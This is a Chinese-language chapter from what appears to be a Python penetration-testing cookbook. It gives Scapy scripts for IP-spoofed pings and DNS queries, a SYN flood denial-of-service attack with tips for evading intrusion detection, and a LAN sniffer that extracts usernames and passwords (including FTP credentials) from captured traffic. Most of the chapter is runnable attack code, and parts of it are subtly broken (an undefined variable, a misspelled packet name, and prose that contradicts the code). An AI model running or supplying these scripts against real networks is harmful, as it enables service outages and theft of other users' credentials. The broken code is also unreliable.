# TCP/IP 攻击

在本章中，我们将涵盖以下内容：

+   IP 欺骗

+   SYN 洪泛

+   使用 Python 在局域网中进行密码嗅探

# 介绍

传输层是提供数据传递、流量控制和错误恢复服务的层。两个主要的传输层协议是 TCP 和 UDP。在本章中，我们将讨论传输层中一些常见的攻击。

# IP 欺骗

使用 Scapy，我们可以简单地制作数据包并发送它们。因此，如果我们伪造源地址并发送它，网络将接受并将响应返回到伪造的地址。现在，我们可以创建一个脚本来使用伪造的 IP 对系统进行 ping。

# 操作步骤...

以下是创建发送伪造 IP 的 ping 请求脚本的步骤：

1.  创建一个`ip-spoof-ping.py`文件并在编辑器中打开它。

1.  然后，我们必须导入所需的模块：

```py
from scapy.all import *  
```

1.  现在为脚本声明变量：

```py
iface = "en0"
fake_ip = '192.168.1.3'
destination_ip = '192.168.1.5'  
```

1.  创建一个函数来发送 ICMP 数据包：

```py
def ping(source, destination, iface):
    pkt = IP(src=source,dst=destination)/ICMP()
    srloop(IP(src=source,dst=destination)/ICMP(), iface=iface)  
```

这将创建以下数据包并开始发送/接收循环：

![](img/00062.jpeg)

1.  开始发送伪造的数据包：

```py
try:
    print ("Starting Ping")
    ping(fake_ip,destination_ip,iface)    
except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)  
```

1.  现在以所需的权限运行脚本：

```py
sudo python3 ip-spoof-ping.py  
```

1.  现在我们可以尝试发送伪造的 DNS 查询。为此，创建另一个名为`dnsQuery()`的函数。

```py
def dnsQuery(source, destination, iface):
    pkt =IP(dst=destination,src=source)/UDP()/DNS(rd=1,qd=DNSQR(qname="example.com"))     sr1(pkt)  
```

这将创建以下数据包，并开始在发送/接收循环中发送：

![](img/00063.jpeg)

1.  然后通过调用此方法发送 DNS 查询：

```py
try: 
    print ("Starting Ping")
    dnsQuery(fake_ip,dns_destination,iface)
except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)  
```

1.  如果我们可以监视受害者的`tcpdump`，我们可以看到 DNS 响应。

# SYN 洪泛

SYN 洪泛是一种使服务对合法用户不可用的 DOS 攻击类型。SYN 洪泛攻击利用了 TCP 协议的*三次握手*，其中客户端发送 TCP SYN 数据包以开始与服务器的连接，服务器回复 TCP SYN-ACK 数据包。然后，在正常操作中，客户端将发送一个 ACK 数据包，然后是数据。这将保持连接处于`SYN_RECV`状态。但是，如果客户端不用 ACK 数据包回应，连接将处于半开放状态。

如果多个攻击者或系统向目标服务器打开了许多这样的半开放连接，它可能填满服务器的 SYN 缓冲区，并且可能停止接收更多的 SYN 数据包，从而导致**拒绝服务**（DoS）攻击：

![](img/00064.jpeg)

我们可以使用 Scapy 生成 SYN 洪泛数据包进行测试。

# 操作步骤...

以下是创建生成 SYN 洪泛攻击脚本的步骤：

1.  创建一个`syn-flooding.py`文件并在编辑器中打开它。

1.  然后，我们必须导入所需的模块：

```py
from scapy.all import *  
```

1.  现在，声明变量：

```py
iface = "en0"
destination_ip = '192.168.1.5'  
```

1.  定义一个函数来创建和发送 SYN 洪泛数据包：

```py
def synFlood(destination, iface):
    print ("Starting SYN Flood")       packet=IP(dst=destination,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
    ans,unans=srloop(paket, iface=iface, inter=0.3,retry=2,timeout=4)
    ans.summary()
    unans.summary()  
```

在这里，随机值用于设置数据包中的 TTL 和 ID。这将有助于混淆服务器中存在的任何入侵检测系统。此外，源端口是由`randshort()`函数创建的随机值。

这是一个创建的示例数据包：

![](img/00065.jpeg)

1.  现在发送数据包：

```py
try:
    synFlood(destination_ip, iface)
except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)  
```

1.  以所需的权限运行此脚本：

```py
sudo python3 syn-flooding.py  
```

# 使用 Python 在局域网中进行密码嗅探

我们已经学习了如何在之前的示例中使用 Scapy 来嗅探数据包。现在我们可以使用 Scapy 来嗅探和提取数据包中的内容。这可以用来获取许多协议的细节。我们可以尝试从这些嗅探到的数据包中获取凭据。我们可以将这个嗅探器绑定到我们的 ARP 欺骗攻击中，以从网络上的其他计算机获取详细信息。

# 操作步骤...

以下是编写局域网密码嗅探器的步骤：

1.  创建一个`pass-sniffer.py`文件并在编辑器中打开它。

1.  导入所需的模块：

```py
from scapy.all import *
from urllib import parse  
```

1.  现在为接口声明变量：

```py
iface = "en0"
conf.verb=0  
```

1.  创建一个方法来检查嗅探到的内容中的用户名和密码：

```py
def get_login_pass(body):    
    user = None
    passwd = None    
    userfields = ['log','login', 'wpname', 'ahd_username', 
'unickname', 'nickname', 'user', 'user_name',
    'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
    'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
    'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
    'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
    'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
    'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']    
     for login in userfields:
          login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
          if login_re:
              user = login_re.group()
      for passfield in passfields:
          pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
         if pass_re:
             passwd = pass_re.group()    
     if user and passwd:
         return (user, passwd)  
```

在这里，我们使用数据中的关键字进行搜索，并提取用户名和密码（如果存在）。

1.  现在，创建一个函数来解析嗅探到的数据包：

```py
def pkt_parser(pkt):    
    if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):
           pass       
      if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
          pkt[TCP].payload
          mail_packet = str(pkt[TCP].payload)    
          body = str(pkt[TCP].payload)
          user_passwd = get_login_pass(body)
          if user_passwd != None:
              print(parse.unquote(user_passwd[0]).encode("utf8"))
              print(parse.unquote( user_passwd[1]).encode("utf8"))
      else:
          pass  
```

首先，我们将忽略没有 IP 层的原始数据包。然后我们获取 IP 层并提取有效载荷，并将其传递给`get_login_pass()`方法来提取凭据。

1.  现在，开始在提供的接口中嗅探数据包：

```py
try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)  
```

1.  现在，以所需的权限运行脚本：

```py
sudo python3 pass-sniffer.py  
```

1.  我们可以通过少量修改来更新这个脚本以提取 FTP 凭据：

```py
if pkt[TCP].dport == 21 or pkt[TCP].sport ==21:
   data = pkt[Raw].load
   print(str(data))  
```

这将打印 FTP 数据。我们可以对其进行正则匹配以获取用户名和密码。
